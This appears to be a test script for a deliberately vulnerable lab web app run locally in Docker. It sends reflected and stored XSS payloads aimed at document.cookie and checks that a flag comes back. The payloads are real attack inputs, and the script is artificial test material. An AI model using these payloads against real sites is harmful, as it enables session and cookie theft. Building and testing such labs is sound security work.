#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
trap "$DC down" EXIT
sleep 3

PORT=8086
FAIL=0

# 1. Normal search returns no flag
OUT=$(curl -sf "http://localhost:$PORT/search?q=hello")
if echo "$OUT" | grep -qE 'POC\{'; then
  echo "[-] FAIL: flag returned on clean search"; FAIL=1
else
  echo "[+] PASS: clean search does not return flag"
fi

# 2. Reflected XSS with document.cookie returns flag
PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('<script>document.location=document.cookie</script>'))")
OUT=$(curl -sf "http://localhost:$PORT/search?q=$PAYLOAD")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  echo "[+] PASS: reflected XSS triggered, flag in response"
else
  echo "[-] FAIL (reflected): $OUT"; FAIL=1
fi

# 3. Stored XSS via comment
curl -sf -X POST "http://localhost:$PORT/comment" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "comment=<img src=x onerror=\"document.cookie\">" > /dev/null
OUT=$(curl -sf "http://localhost:$PORT/comment")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  echo "[+] PASS: stored XSS triggered, flag in response"
else
  echo "[-] FAIL (stored): $OUT"; FAIL=1
fi

# 4. /flag endpoint requires admin cookie
STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:$PORT/flag")
if [ "$STATUS" = "403" ]; then
  echo "[+] PASS: /flag without admin cookie returns 403"
else
  echo "[-] FAIL: expected 403, got $STATUS"; FAIL=1
fi

if [ "$FAIL" -eq 0 ]; then
  echo "[+] All tests passed"
  exit 0
else
  echo "[-] One or more tests failed"
  exit 1
fi
